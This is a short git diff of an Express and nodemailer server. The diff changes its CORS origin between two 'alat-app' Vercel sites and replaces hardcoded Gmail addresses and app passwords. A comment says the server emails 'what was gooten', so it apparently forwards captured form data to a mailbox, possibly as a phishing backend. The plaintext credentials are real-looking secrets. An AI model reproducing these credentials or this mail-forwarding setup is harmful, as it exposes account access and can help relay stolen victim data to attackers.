@@ -1,3 +1,4 @@
+
 const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
 
 const app = express(); // app is use for link express functions
@@ -5,14 +6,14 @@ const cors = require("cors");
 const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
 
 app.use(express.json());
-app.use(cors({ origin: "https://alat-app-ten.vercel.app" }));
+app.use(cors({ origin: "https://alat-app-blush.vercel.app" }));
 
 
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "ajaeroelvis4@gmail.com";
-const pass = "ylxnobprypgjidpw";
+const userEmail = "bluecoralbeachresort7@gmail.com";
+const pass = "xquekbdhhxggmzjz";
 // 15 APRIL
 
 // Middleware
